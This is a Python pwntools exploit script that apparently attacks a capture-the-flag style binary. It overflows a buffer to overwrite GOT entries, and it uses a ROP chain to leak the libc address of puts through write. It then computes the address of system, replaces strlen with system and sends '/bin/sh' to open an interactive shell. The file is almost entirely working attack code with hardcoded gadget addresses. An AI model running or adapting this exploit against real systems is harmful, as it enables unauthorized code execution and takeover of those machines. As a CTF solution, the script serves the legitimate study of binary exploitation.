import sys
import struct

from pwn import *


context.log_level = 'debug'


def to_n(addr):
    return struct.unpack('Q', addr)[0]


def main(filename='../service/main'):
    pop_rdi     = p64(0x400d63)
    pop_rdx     = p64(0x400b23)
    pop_rsi_r15 = p64(0x400d61)
    pop_rbp     = p64(0x400968)
    
    read_plt    = p64(0x400870)
    write_plt   = p64(0x400820)
    strlen_plt  = p64(0x400830)

    puts_got    = p64(0x602018)
    strlen_got  = p64(0x602028)
    
    welcome     = p64(0x400B93)

    pc   = process(filename, env={'LD_PRELOAD': '../service/libc.so.6'})
    # libc = ELF('/lib/x86_64-linux-gnu/libc-2.25.so')
    libc = ELF('../service/libc.so.6')

    # overwrite fflush with the next part of login_panel
    pc.sendlineafter(': ', 'A' * 92 + p64(0x602068))
    pc.sendafter(': ', str(0x400C56))

    # leak libc address of puts using write and overwrite strlen with system using read function
    pc.sendline('A' * 24 + pop_rdi + p64(1) + pop_rsi_r15 + puts_got + p64(0) + write_plt + pop_rdi + p64(0) + pop_rsi_r15 + strlen_got + p64(0) + read_plt + pop_rbp + p64(0x602000 + 0x70) + welcome)

    pc.recvuntil('Enter command: ')

    puts = to_n(pc.recv(8))
    system = puts - libc.symbols['puts'] + libc.symbols['system']
    log.info('system libc @ ' + hex(system))

    pc.sendline(p64(system))
    pc.sendline('/bin/sh\x00')

    pc.interactive()

if __name__ == '__main__':
    if len(sys.argv) == 2:
        main(sys.argv[1])
    else:
        main()